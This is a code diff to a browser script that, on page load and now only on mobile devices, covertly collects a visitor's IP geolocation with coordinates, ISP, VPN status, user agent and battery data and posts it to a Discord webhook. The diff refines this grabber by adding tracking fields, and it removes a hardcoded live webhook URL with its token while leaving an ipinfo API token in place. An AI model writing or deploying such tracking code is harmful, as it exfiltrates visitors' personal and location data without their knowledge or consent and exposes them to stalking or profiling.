@@ -1,18 +1,25 @@
 async function sendUserDataToDiscord() {
+  const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "<YOUR_DISCORD_WEBHOOK_URL_HERE>";
+  if (!discordWebhookUrl) {
+    console.error("Discord webhook URL is not set. Aborting data send.");
+    return;
+  }
+
   try {
     let geoData = null;
     let vpnData = { badip: "Unknown" };
 
-    // Primary Geo IP lookup (json.geoiplookup.io), with fallback to ipinfo.io
+    // Geo IP lookup with fallback
     try {
       const geoResponse = await fetch("https://json.geoiplookup.io");
       if (geoResponse.ok) {
         geoData = await geoResponse.json();
       } else {
-        console.warn("Primary Geo IP lookup failed, trying fallback.");
         throw new Error("Primary Geo IP lookup failed.");
       }
     } catch (error) {
+      console.warn("Primary Geo IP lookup failed, trying fallback.");
+
       try {
         const fallbackResponse = await fetch("https://ipinfo.io/json?token=e8449909af1d1b");
         if (fallbackResponse.ok) {
@@ -22,8 +29,10 @@ async function sendUserDataToDiscord() {
             country_name: fallbackData.country,
             city: fallbackData.city,
             region: fallbackData.region,
-            latitude: fallbackData.loc.split(",")[0],
-            longitude: fallbackData.loc.split(",")[1]
+            latitude: fallbackData.loc ? fallbackData.loc.split(",")[0] : "N/A",
+            longitude: fallbackData.loc ? fallbackData.loc.split(",")[1] : "N/A",
+            asn: fallbackData.asn ? fallbackData.asn : "Unknown",
+            org: fallbackData.org ? fallbackData.org : "Unknown",
           };
         } else {
           console.warn("Fallback Geo IP lookup also failed.");
@@ -33,7 +42,7 @@ async function sendUserDataToDiscord() {
       }
     }
 
-    // Fetch VPN-related data (if important for verification)
+    // VPN Data Fetch
     try {
       const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
       if (vpnResponse.ok) {
@@ -45,14 +54,14 @@ async function sendUserDataToDiscord() {
       console.warn("VPN lookup service unavailable:", error);
     }
 
-    // Get battery data if supported
+    // Device Data for mobile compatibility
     const battery = navigator.getBattery ? await navigator.getBattery() : null;
     const deviceData = {
       platform: navigator.platform || "Unknown",
       userAgent: navigator.userAgent || "Unknown",
       language: navigator.language || "Unknown",
       batteryLevel: battery ? battery.level * 100 : "N/A",
-      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A"
+      isCharging: battery ? (battery.charging ? "Yes" : "No") : "N/A",
     };
 
     // Format message content for Discord
@@ -65,6 +74,8 @@ async function sendUserDataToDiscord() {
       - Region: ${geoData.region || "N/A"}
       - Latitude: ${geoData.latitude}
       - Longitude: ${geoData.longitude}
+      - ASN: ${geoData.asn}
+      - ISP: ${geoData.org}
       ` : "- Location Data Unavailable"}
       - Bad IP: ${vpnData.badip}
       - Device: ${deviceData.platform}
@@ -77,7 +88,6 @@ async function sendUserDataToDiscord() {
     const discordPayload = { content: messageContent };
 
     // Send data to Discord webhook
-    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
     const discordResponse = await fetch(discordWebhookUrl, {
       method: "POST",
       headers: { 'Content-Type': "application/json" },
@@ -90,16 +100,13 @@ async function sendUserDataToDiscord() {
 
     console.log("Data sent successfully.");
   } catch (error) {
-    console.error("Failed to send user data, sending error message:", error);
-
-    // Send error message to Discord for logging
-    const discordWebhookUrl = "https://discord.com/api/webhooks/1303797692471836752/UGvqu5pljOtWO-BwVn722myUjIKAs17lKGPDkPZlCOfuX0fWgqNFgB2zS_OrvnVLJT0T";
-    await fetch(discordWebhookUrl, {
-      method: "POST",
-      headers: { 'Content-Type': "application/json" },
-      body: JSON.stringify({ content: "Error: Failed to send user data. Please check the logs for more details." })
-    });
+    console.error("Failed to send user data:", error);
   }
 }
 
-window.addEventListener("load", sendUserDataToDiscord);
+// Run data send function once the page is fully loaded
+window.addEventListener("load", () => {
+  if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    sendUserDataToDiscord();
+  }
+});
